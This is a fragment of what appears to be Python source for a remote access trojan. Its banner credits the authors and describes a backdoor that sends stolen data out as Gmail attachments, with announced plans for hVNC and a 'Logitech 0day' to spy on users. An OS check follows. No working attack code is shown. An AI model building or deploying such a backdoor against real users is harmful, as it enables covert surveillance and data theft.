...
[+] OG Author: Viral Maniar
[+] New kid on the block: r3dg0d
[+] Twitter: @ManiarViral
[+] New kids twitter: 0byteZ
[+] Description: Python based backdoor that uses Gmail to exfiltrate data as an attachment.
[+] future code will use silent hVNC server and a Logitech 0day via Gmail / Twilio SMS to spy on users.
[+] This is a basic Remote Access Trojan.
...
[+] Python version: 3.6.3 (3.6__)
[+] PowerShell version: 5.1 (Powershell 5__)
'''
return logo
...
if os.name == "nt":
print ('[+] All good.... We are in like the flynn.')
else:
